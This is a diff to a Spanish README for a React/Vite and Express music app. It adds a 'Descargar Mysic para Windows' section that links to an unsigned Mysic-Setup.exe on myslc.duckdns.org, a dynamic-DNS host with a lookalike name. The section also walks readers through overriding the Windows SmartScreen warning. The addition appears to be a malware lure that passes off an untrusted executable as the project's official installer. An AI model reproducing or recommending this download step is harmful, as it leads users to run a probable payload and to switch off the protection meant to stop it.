@@ -2,6 +2,29 @@
 
 Aplicación React/Vite con API Express, catálogo PostgreSQL, datos de usuario en MongoDB y autenticación por correo/contraseña o Google.
 
+## Descargar Mysic para Windows
+
+<table>
+  <tr>
+    <td align="center" width="560">
+      <h3>Mysic para Windows</h3>
+      <p>Aplicación de escritorio · Windows 10 y 11 (64 bits) · instalador de unos 11 MB</p>
+      <p>
+        <a href="https://myslc.duckdns.org/downloads/Mysic-Setup.exe">
+          <img src="https://img.shields.io/badge/Descargar-Mysic--Setup.exe-ff6542?style=for-the-badge" alt="Descargar Mysic para Windows" height="44">
+        </a>
+      </p>
+      <p><a href="https://myslc.duckdns.org/downloads/Mysic-Setup.exe">https://myslc.duckdns.org/downloads/Mysic-Setup.exe</a></p>
+    </td>
+  </tr>
+</table>
+
+Cómo instalar:
+
+1. Descarga `Mysic-Setup.exe` con el botón o el enlace de arriba.
+2. Ábrelo. Si Windows muestra «Windows protegió su PC», pulsa **Más información** y luego **Ejecutar de todas formas**: el instalador aún no está firmado.
+3. Sigue el asistente. Mysic queda en el menú Inicio y se actualiza instalando una versión nueva encima.
+
 ## Inicio rápido
 
 No mezcles datos ni credenciales entre entornos. El repositorio es único, pero cada proceso debe usar el conjunto completo de un solo entorno:
